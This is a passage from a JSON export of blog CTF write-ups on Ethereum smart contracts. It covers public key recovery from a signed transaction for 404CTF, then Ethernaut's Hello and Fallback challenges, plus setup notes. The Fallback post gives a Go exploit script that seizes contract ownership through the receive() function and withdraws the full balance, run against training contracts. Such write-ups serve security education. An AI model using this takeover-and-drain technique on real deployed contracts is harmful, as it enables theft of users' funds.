\u0026#34;math/big\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/common\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/core/types\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/crypto\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/ethclient\u0026#34; ) var fork bool func main() { var blockchainURL, contractAddress string flag.BoolVar(\u0026amp;fork, \u0026#34;fork\u0026#34;, true, \u0026#34;Should we use the parameter for the fork blockchain ? (default: true)\u0026#34;) flag.Parse() contractAddress = \u0026#34;0x9Eb8F52b22024003C1312ea1569cf14208f3c30A\u0026#34; if fork { blockchainURL = \u0026#34;http://127.0.0.1:8545\u0026#34; } else { blockchainURL = \u0026#34;https://ropsten.infura.io/v3/\u0026lt;APIKEY\u0026gt;\u0026#34; } client, err := ethclient.Dial(blockchainURL) if err != nil { log.Fatal(err) } // Contract contractAddressHash := common.HexToAddress(contractAddress) storageContent, _ := client.StorageAt(context.Background(), contractAddressHash, common.BigToHash(big.NewInt(0)), nil) fmt.Println(\u0026#34;secretAddress:\u0026#34;, common.Bytes2Hex(storageContent)) // Get the raw transaction in hex txHash := common.HexToHash(\u0026#34;0x3e641c314c4ffdfedad05dcee63910aa846711730b0c7366feb635b2e16b5cdb\u0026#34;) tx, _, _ := client.TransactionByHash(context.Background(), txHash) rawTXBytes, _ := tx.MarshalBinary() fmt.Println(\u0026#34;Raw data =\u0026gt;\u0026#34;, common.Bytes2Hex(rawTXBytes)) v, r, s := tx.RawSignatureValues() //fmt.Println(recoverPlain(a.Hash(), r, s, v, true)) var z types.FrontierSigner calculatedSenderAddress, _ := recoverPlain(z.Hash(tx), r, s, v, true) fmt.Println(\u0026#34;Calculated sender address =\u0026gt;\u0026#34;, calculatedSenderAddress) } // recoverPlain attempts to recover the public key from the signature. // From https://github.com/ethereum/go-ethereum/blob/4b309c70065e68321f6ba518f35b0454a5c929a9/core/types/transaction_signing.go#L482 func recoverPlain(sighash common.Hash, R, S, Vb *big.Int, homestead bool) (common.Address, error) { if Vb.BitLen() \u0026gt; 8 { return common.Address{}, errors.New(\u0026#34;Invalid Sig\u0026#34;) } V := byte(Vb.Uint64() - 27) if !crypto.ValidateSignatureValues(V, R, S, homestead) { return common.Address{}, errors.New(\u0026#34;Invalid Sig\u0026#34;) } // encode the signature in uncompressed format r, s := R.Bytes(), S.Bytes() sig := make([]byte, crypto.SignatureLength) copy(sig[32-len(r):32], r) copy(sig[64-len(s):64], s) sig[64] = V // recover the public key from the signature pub, err := crypto.Ecrecover(sighash[:], sig) fmt.Println(\u0026#34;Recovered public key =\u0026gt;\u0026#34;, common.Bytes2Hex(pub)) if err != nil { return common.Address{}, err } if len(pub) == 0 || pub[0] != 4 { return common.Address{}, errors.New(\u0026#34;invalid public key\u0026#34;) } var addr common.Address copy(addr[:], crypto.Keccak256(pub[1:])[12:]) return addr, nil } 1 2 3 4 ... Recovered public key =\u0026gt; 040313073748ea0af8e0782adae7c15f2bd46b5179dab5a200307a41868b9dade1fd7eebc17da98c8d2065e429b1fd05e7651e08bda5b279254530f5b00f4487f2 Calculated sender address =\u0026gt; 0xcF9A54585b20041aC1265Ad64cE21d09fD4b1324 You can notice, that to convert the public key to an address, the first bytes (two characters) are ignored. This is because the 04 is a tag bytes for the ASN.1 OCTET String structure.\nWe can check the public key by sending it the contract with the cast command of the foundry binaries.\n1 cast send 0x9Eb8F52b22024003C1312ea1569cf14208f3c30A \u0026#34;isPublicKey(bytes)\u0026#34; \u0026#34;0313073748ea0af8e0782adae7c15f2bd46b5179dab5a200307a41868b9dade1fd7eebc17da98c8d2065e429b1fd05e7651e08bda5b279254530f5b00f4487f2\u0026#34; --rpc-url http://localhost:8545 --private-key 0x..... ","date":"2022-06-10T00:00:00Z","image":"https://nodauf.dev/images/404CTF.png","permalink":"https://nodauf.dev/p/writeup-404ctf-2022-public-key-web3/","title":"Writeup 404CTF 2022 - public key (web3)"},{"content":"The environment Hello Ethernaut is not really a challenge written to show a vulnerability, but a way to introduce the concept of interact with smart contracts.\nOn every languages, the client need the ABI of the contract to interact with it. The JS client has already been configured on the browser and we can ues it to retrieve the ABI of the contract.\nIn your development console, type contract.abi and you will see the ABI of the contract.\nIt can the be copied to the file contracts/HelloEthernaut.abi (see the introduction post to know the structure of the writeups)\nThe ABI can be converted to a go file with abigen command. The generated files will contains fonction to interact with the contract.\n1 abigen --abi=./HelloEthernaut.abi --pkg=HelloEthernaut --out=../0-HelloEthernaut/0-HelloEthernaut.go Exploitation The instruction for the challenge is to run await contract.info(). We will do the same in Go.\nThe first step is to create the client and load th newly generated file get from the ABI.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package main import ( \u0026#34;log\u0026#34; \u0026#34;flag\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/ethclient\u0026#34; store \u0026#34;ethernaut-golang/ethernautChallenges/0-HelloEthernaut\u0026#34; ) func main() { var blockchainURL, contractAddress, privateKey string fork := flag.Bool(\u0026#34;fork\u0026#34;, true, \u0026#34;Should we use the parameter for the fork blockchain ? (default: true)\u0026#34;) flag.Parse() contractAddress = \u0026#34;0x80513274a0FA9abF1a458bF6BEed397fd0dBcef3\u0026#34; if *fork { blockchainURL = \u0026#34;http://127.0.0.1:8545\u0026#34; privateKey = \u0026#34;ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\u0026#34; } else { blockchainURL = \u0026#34;https://eth-rinkeby.alchemyapi.io/v2/\u0026lt;API-KEY\u0026gt;\u0026#34; privateKey = \u0026#34;\u0026lt;private key\u0026gt;\u0026#34; } client, err := ethclient.Dial(blockchainURL) if err != nil { log.Fatal(err) } // Contract contractAddressHash := common.HexToAddress(contractAddress) instance, err := store.NewHelloEthernaut(contractAddressHash, client) if err != nil { log.Fatal(err) } Full code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 package main import ( \u0026#34;context\u0026#34; \u0026#34;crypto/ecdsa\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;math/big\u0026#34; store \u0026#34;ethernaut-golang/ethernautChallenges/0-HelloEthernaut\u0026#34; \u0026#34;flag\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/accounts/abi/bind\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/common\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/crypto\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/ethclient\u0026#34; ) func main() { var blockchainURL, contractAddress, privateKey string fork := flag.Bool(\u0026#34;fork\u0026#34;, true, \u0026#34;Should we use the parameter for the fork blockchain ? (default: true)\u0026#34;) flag.Parse() contractAddress = \u0026#34;0x80513274a0FA9abF1a458bF6BEed397fd0dBcef3\u0026#34; if *fork { blockchainURL = \u0026#34;http://127.0.0.1:8545\u0026#34; privateKey = \u0026#34;ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\u0026#34; } else { blockchainURL = \u0026#34;https://eth-rinkeby.alchemyapi.io/v2/\u0026lt;API-KEY\u0026gt;\u0026#34; privateKey = \u0026#34;\u0026lt;private key\u0026gt;\u0026#34; } client, err := ethclient.Dial(blockchainURL) if err != nil { log.Fatal(err) } // Contract contractAddressHex := common.HexToAddress(contractAddress) instance, err := store.NewHelloEthernaut(contractAddressHex, client) if err != nil { log.Fatal(err) } infoOutput, _ := instance.Info(nil) fmt.Println(\u0026#34;info:\u0026#34;, infoOutput) info1Output, _ := instance.Info1(nil) fmt.Println(\u0026#34;info1:\u0026#34;, info1Output) info2Output, _ := instance.Info2(nil, \u0026#34;hello\u0026#34;) fmt.Println(\u0026#34;info2:\u0026#34;, info2Output) infoNumOutput, _ := instance.InfoNum(nil) fmt.Println(\u0026#34;infoNum:\u0026#34;, infoNumOutput) info42Output, _ := instance.Info42(nil) fmt.Println(\u0026#34;info42:\u0026#34;, info42Output) theMethodNameOutput, _ := instance.TheMethodName(nil) fmt.Println(\u0026#34;theMethodName:\u0026#34;, theMethodNameOutput) method7123949Output, _ := instance.Method7123949(nil) fmt.Println(\u0026#34;method7123949:\u0026#34;, method7123949Output) passwordOutput, _ := instance.Password(nil) fmt.Println(\u0026#34;password field is:\u0026#34;, passwordOutput) // For a write transaction on the smart contract we need to be authenticated auth := newTransactor(client, privateKey) instance.Authenticate(auth, \u0026#34;ethernaut0\u0026#34;) } func newTransactor(client *ethclient.Client, privateKeyStr string) *bind.TransactOpts { privateKey, err := crypto.HexToECDSA(privateKeyStr) if err != nil { log.Fatal(err) } publicKey := privateKey.Public() publicKeyECDSA, ok := publicKey.(*ecdsa.PublicKey) if !ok { log.Fatal(\u0026#34;cannot assert type: publicKey is not of type *ecdsa.PublicKey\u0026#34;) } fromAddress := crypto.PubkeyToAddress(*publicKeyECDSA) nonce, err := client.PendingNonceAt(context.Background(), fromAddress) if err != nil { log.Fatal(err) } gasPrice, err := client.SuggestGasPrice(context.Background()) if err != nil { log.Fatal(err) } fmt.Println(fromAddress) auth := bind.NewKeyedTransactor(privateKey) auth.Nonce = big.NewInt(int64(nonce)) auth.Value = big.NewInt(0) // in wei auth.GasLimit = uint64(2000000) // in units auth.GasPrice = gasPrice return auth } ","date":"2022-05-18T00:00:00Z","image":"https://nodauf.dev/images/openzeppelin-logo.svg","permalink":"https://nodauf.dev/p/ethernaut-challenges-0.-hello-ethernaut/","title":"Ethernaut challenges - 0. Hello Ethernaut"},{"content":"Introduction This challenge introduce the notion of fallback in Solidity.\nA contract can have exactly one unnamed function (for solidity version prior 0.6.0, otherwise the fallback function has the keyword fallback). This function cannot have arguments, cannot return anything and has to have external visibility. It is executed on a call to the contract if none of the other functions match the given function identifier (or if no data was supplied at all) - source and source for solidity \u0026gt; 0.6.0\nA fallback function looks like this\n1 2 3 4 5 6 7 8 9 contract Test { function() external payable { ... } // or for solidity \u0026gt; 0.6.0 fallback() external payable { ... } } The source code of the challenge is\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 // SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import \u0026#39;@openzeppelin/contracts/math/SafeMath.sol\u0026#39;; contract Fallback { using SafeMath for uint256; mapping(address =\u0026gt; uint) public contributions; address payable public owner; constructor() public { owner = msg.sender; contributions[msg.sender] = 1000 * (1 ether); } // [1] modifier onlyOwner { require( msg.sender == owner, \u0026#34;caller is not the owner\u0026#34; ); _; } function contribute() public payable { require(msg.value \u0026lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] \u0026gt; contributions[owner]) { owner = msg.sender; } } function getContribution() public view returns (uint) { return contributions[msg.sender]; } function withdraw() public onlyOwner { owner.transfer(address(this).balance); } // [2] receive() external payable { // [3] require(msg.value \u0026gt; 0 \u0026amp;\u0026amp; contributions[msg.sender] \u0026gt; 0); owner = msg.sender; } } [1]: The modifier onlyOwner is used to restrict the function to the owner of the contract. It can be used to apply a restriction to a function, this modifier is being use by the function withdraw() [2]: This is our fallback function. The keyword receive() has been introduced in solidity 0.6.0 to handle when a contract received ethers with no data. For more details a blog post on soliditylang has been written [3]: This condition check if ethers is sent in the transaction and if the sender has contributed to the contract with the function contribute(). The environment Like for the previous challenge, we have to generate our golang file (see the introduction post to know the structure of the writeups). This time we will use the solidity code.\nThe environment has to be configured, the solc binary (version 0.7.6 to match the contract requirements) and abigen are needed.\n1 2 3 4 mkdir ../1-Fallback npm install @openzeppelin/contracts@3.4 solc --abi Fallback.sol -o . @openzeppelin/=$(pwd)/node_modules/@openzeppelin/ abigen --abi=./Fallback.abi --pkg=Fallback --out=../1-Fallback/1-Fallback.go An optional but recommended step is to work on a fork of the blockchain for faster performance and easier debugging.\n1 2 3 npx hardhat node --fork https://eth-rinkeby.alchemyapi.io/v2/\u0026lt;APIKEY\u0026gt; #or anvil --fork-url https://eth-rinkeby.alchemyapi.io/v2/\u0026lt;APIKEY\u0026gt; Exploitation To validate the challenge, there are two steps:\nyou claim ownership of the contract you reduce its balance to 0 The exploitation is straightforward, the fallback function can be called to update the owner of the contract and then the withdraw() function to reduce the balance of the contract to 0. Before calling the fallback function, we need to have contribute to have more than 0 in the contributions balance.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 package main import ( \u0026#34;context\u0026#34; \u0026#34;crypto/ecdsa\u0026#34; \u0026#34;flag\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;math/big\u0026#34; store \u0026#34;ethernaut-golang/ethernautChallenges/1-Fallback\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/accounts/abi/bind\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/common\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/core/types\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/crypto\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/ethclient\u0026#34; ) var fork bool func main() { var blockchainURL, contractAddress, privateKey string flag.BoolVar(\u0026amp;fork, \u0026#34;fork\u0026#34;, true, \u0026#34;Should we use the parameter for the fork blockchain ? (default: true)\u0026#34;) flag.Parse() contractAddress = \u0026#34;0xbc81037C99ECAabf115405b76AE630AB2e753EfA\u0026#34; if fork { blockchainURL = \u0026#34;http://127.0.0.1:8545\u0026#34; privateKey = \u0026#34;ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80\u0026#34; } else { blockchainURL = \u0026#34;https://eth-rinkeby.alchemyapi.io/v2/\u0026lt;API-KEY\u0026gt;\u0026#34; privateKey = \u0026#34;\u0026lt;private key\u0026gt;\u0026#34; } // Connect to the node client, err := ethclient.Dial(blockchainURL) if err != nil { log.Fatal(err) } // Contract contractAddressHash := common.HexToAddress(contractAddress) instance, err := store.NewFallback(contractAddressHash, client) if err != nil { log.Fatal(err) } // Get the owner of the contract owner, _ := instance.Owner(nil) fmt.Println(\u0026#34;owner:\u0026#34;, owner) fmt.Println(\u0026#34;1. Call contribute with 1 wei\u0026#34;) auth := newTransactor(client, privateKey) // Update auth to send 1 wei auth.Value = big.NewInt(1) // in wei _, err = instance.Contribute(auth) if err != nil { log.Fatal(err) } fmt.Println(\u0026#34;2. Trigger the fallback function\u0026#34;) signedTx := transactionFallback(client, privateKey, address) fmt.Printf(\u0026#34;tx fallback: %s\\n\u0026#34;, signedTx.Hash()) err = client.SendTransaction(context.Background(), signedTx) if err != nil { log.Fatal(\u0026#34;SendTx: \u0026#34; + err.Error()) } // Wait for the transaction to be mined and process by the blockchain bind.WaitMined(context.Background(), client, signedTx) fmt.Println(\u0026#34;tx confirmed\u0026#34;) // Check the owner owner, _ = instance.Owner(nil) fmt.Println(\u0026#34;owner:\u0026#34;, owner) fmt.Println(\u0026#34;3. Withdraw everything\u0026#34;) auth = newTransactor(client, privateKey) _, err = instance.Withdraw(auth) if err != nil { log.Fatal(err) } } // newTransactor creates a transaction signer based on the provided private key func newTransactor(client *ethclient.Client, privateKeyStr string) *bind.TransactOpts { privateKey, err := crypto.HexToECDSA(privateKeyStr) if err != nil { log.Fatal(err) } publicKey := privateKey.Public() publicKeyECDSA, ok := publicKey.(*ecdsa.PublicKey) if !ok { log.Fatal(\u0026#34;cannot assert type: publicKey is not of type *ecdsa.PublicKey\u0026#34;) } fromAddress := crypto.PubkeyToAddress(*publicKeyECDSA) nonce, err := client.PendingNonceAt(context.Background(), fromAddress) if err != nil { log.Fatal(err) } gasPrice, err := client.SuggestGasPrice(context.Background()) if err != nil { log.Fatal(err) } //fmt.Println(\u0026#34;gasPrice:\u0026#34;, gasPrice) //fmt.Println(\u0026#34;nonce:\u0026#34;, nonce) auth := bind.NewKeyedTransactor(privateKey) auth.Nonce = big.NewInt(int64(nonce)) auth.Value = big.NewInt(0) // in wei auth.GasLimit = uint64(2000000) // in units auth.GasPrice = gasPrice return auth } // transactionFallback creates a transaction to call the fallback function of the toAddress contract func transactionFallback(client *ethclient.Client, privateKeyStr string, toAddress common.Address) *types.Transaction { privateKey, err := crypto.HexToECDSA(privateKeyStr) if err != nil { log.Fatal(err) } publicKey := privateKey.Public() publicKeyECDSA, ok := publicKey.(*ecdsa.PublicKey) if !ok { log.Fatal(\u0026#34;cannot assert type: publicKey is not of type *ecdsa.PublicKey\u0026#34;) } fromAddress := crypto.PubkeyToAddress(*publicKeyECDSA) nonce, err := client.PendingNonceAt(context.Background(), fromAddress) if err != nil { log.Fatal(err) } gasPrice, err := client.SuggestGasPrice(context.Background()) if err != nil { log.Fatal(err) } var data []byte //tx := types.NewTransaction(nonce, toAddress, big.NewInt(5), uint64(2000000), gasPrice, data) var txData types.LegacyTx txData.Data = data txData.Nonce = nonce txData.To = \u0026amp;toAddress txData.Value = big.NewInt(5) txData.Gas = uint64(2000000) txData.GasPrice = gasPrice tx := types.NewTx(\u0026amp;txData) // Cannot get the networkID of the fork var chainID *big.Int if fork { chainID = big.NewInt(1) } else { chainID, err = client.NetworkID(context.Background()) if err != nil { log.Fatal(\u0026#34;networkID: \u0026#34; + err.Error()) } } signedTx, err := types.SignTx(tx, types.NewEIP155Signer(chainID), privateKey) if err != nil { log.Fatal(err) } return signedTx } ","date":"2022-05-18T00:00:00Z","image":"https://nodauf.dev/images/openzeppelin-logo.svg","permalink":"https://nodauf.dev/p/ethernaut-challenges-1.-fallback/","title":"Ethernaut challenges - 1. Fallback"},{"content":"I am starting a series of writeup of the Ethernaut challenges, this project have been initiated by OpenZeppelin team to teach basic knowledge of smart contracts auditing.\nThe challenges will be resolved with Foundry, the client, if needed will be written in Golang and the smart contracts will be written in Solidity.\nThe current list of challenges are:\nHello Ethernaut Fallback Fallout CoinFlip Telephone Token Delegation Force Vault King Re-Entrancy Elevator Privacy GatekeeperOne GatekeeperTwo NaughtCoin Preservation Recovery Magic Number AlienCodex Denial Shop Dex Dex Two PuzzleWallet Motorbike The folder structure of each challenge is:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ethernautWritup ├── about │ ├── index.md ├── ethernautChallenges │ ├── 0-HelloEthernaut │ │ ├── 0-HelloEthernaut.go │ ├──1-Fallback │ | └── 1-Fallback.go │ ├──2-Fallout │ | └── 2-Fallout.go │ ├──... │ └── contracts ├── 0-HelloEthernaut.sol # If provided └── HelloEthernaut.abi When a smart contract is needed to resolve the challenge, foundry will be used. The environment can be created with\n1 forge init ethernaut It will look like this\n1 2 3 4 5 6 7 8 9 10 11 12 ethernaut ├── lib │ ├── ... ├── src │ ├── challengeName.sol # Source of the challenge │ ├──... │ ├── test │ ├── challengeName.t.sol # Contract to resolve the challenge │ └── ... │ └── foundry.toml To convert easily the solidity code to go code the solidity2go.sh script will be used:\n1 2 3 4 5 6 7 8 9 10 11 #!/bin/bash if [[ $1 -eq \u0026#34;\u0026#34; ]]; then echo \u0026#34;The name is required\u0026#34; exit fi mkdir ../$1 ./solc --abi $1.sol -o . --overwrite @openzeppelin/=$(pwd)/node_modules/@openzeppelin/ pkgName=$(cat $1.sol| grep contract | cut -d\u0026#34; \u0026#34; -f 2) ./abigen --abi=./$pkgName.abi --pkg=$pkgName --out=../$1/$1.go In the same folder, the node_modules should be installed\n1 npm i @openzeppelin/contracts@3.4 For example for the challenge 1-Fallback, the script will be called like this:\n1 ./solidity2go.sh 1-Fallback I\u0026rsquo;m going to learn a lot during this series, so the solutions written in Go or Solidity will probably get better and better as I go through the challenges.\n","date":"2022-05-16T00:00:00Z","image":"https://nodauf.dev/images/openzeppelin-logo.svg","permalink":"https://nodauf.dev/p/ethernaut-challenges/","title":"Ethernaut challenges"},{"content":"Configure a proper environment to play wih Web3, debug and audits smart contracts can be a pain at the beginning.\nThe purpose of this post is to rough out the tools to keep only the most interesting.\nsolc Solc is a compiler for the Solidity language. It transform the Solidity code into a bytecode.\nabigen Foundry Founrdry defined themself as:\nFoundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust. It\u0026rsquo;s a swiss army knife for Ethereum application. It allows to fork the blockchain, deploy smart contract, directly call the smart contracts and more.\nIt is composed of three tools:\nForge: Ethereum testing framework (like Truffle, Hardhat and Dapptools). Cast: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data. Anvil: Used to fork the blockchain and run a local node like Ganache or Hardhat. Installation instructions\nIt is one of the most complete tool for auditing and developping smart contracts.\nHardhat Remix Truffle Setup This post will be updated when new tools that can improve the environment are published\n","date":"2021-08-20T00:00:00Z","permalink":"https://nodauf.dev/p/setting-up-the-environment/","title":"Setting up the environment"}]